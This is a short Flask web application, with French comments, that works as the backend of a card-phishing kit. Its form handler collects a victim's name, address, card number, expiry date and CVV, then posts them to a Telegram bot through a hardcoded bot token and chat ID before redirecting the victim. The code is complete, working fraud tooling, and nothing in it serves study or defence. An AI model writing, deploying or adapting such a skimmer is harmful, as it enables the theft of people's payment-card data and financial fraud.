from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# Remplace ces valeurs avec les tiennes
TELEGRAM_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
TELEGRAM_CHAT_ID = '6297861735'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/formulaire')
def formulaire():
    return render_template('formulaire.html')

@app.route('/send', methods=['POST'])
def send():
    prenom = request.form.get('prenom')
    nom = request.form.get('nom')
    adresse = request.form.get('adresse')
    carte = request.form.get('carte')
    date = request.form.get('date')
    cvv = request.form.get('cvv')

    message = f"""
📲 Nouvelle soumission :

👤 Nom : {prenom} {nom}
🏠 Adresse : {adresse}
💳 Carte : {carte}
📅 Exp : {date}
🔒 CVV : {cvv}
"""

    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }

    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Erreur d'envoi Telegram :", e)

    return redirect('/')
